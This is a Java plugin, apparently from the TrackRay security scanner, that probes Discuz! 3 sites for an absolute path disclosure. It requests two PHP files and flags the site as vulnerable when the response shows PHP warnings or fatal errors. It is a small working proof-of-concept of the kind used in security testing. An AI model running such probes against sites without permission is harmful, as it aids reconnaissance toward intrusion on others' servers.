package com.trackray.module.poc;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.bean.Result;
import com.trackray.base.bean.Task;
import com.trackray.base.bean.Vulnerable;
import com.trackray.base.enums.FingerPrint;
import com.trackray.base.plugin.AbstractPOC;
import org.apache.commons.lang3.StringUtils;

import java.net.MalformedURLException;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/5/9 10:27
 */
@Plugin(title = "discuz 3 绝对路径泄漏漏洞",author = "浅蓝")
public class DiscuzRealPathLeak extends AbstractPOC {
    @Override
    public void attack(Task task) {
        String[] payloads = new String[]{"/source/plugin/mobile/api/1/index.php","/source/function/function_connect.php"};

        for (String payload : payloads) {

            try {
                String body = requests.url(getTarget().concat(payload)).get().body();

                if (StringUtils.containsAny(body,"Warning","Fatal error")){
                    Vulnerable vulnerable = Vulnerable.builder()
                            .title("Discuz 绝对路径泄漏")
                            .type(Vulnerable.Type.INFO_LEAKAGE.getType())
                            .payload(payload)
                            .address(getTarget().concat(payload))
                            .level(Vulnerable.Level.LOW.getLevel())
                            .build();

                    addVulnerable(vulnerable);
                }
            } catch (MalformedURLException e) {
                continue;
            }

        }


    }

    @Override
    public boolean check(Result result) {
        return result.getSystemInfo().getFinger() == FingerPrint.$Discuz;
    }
}
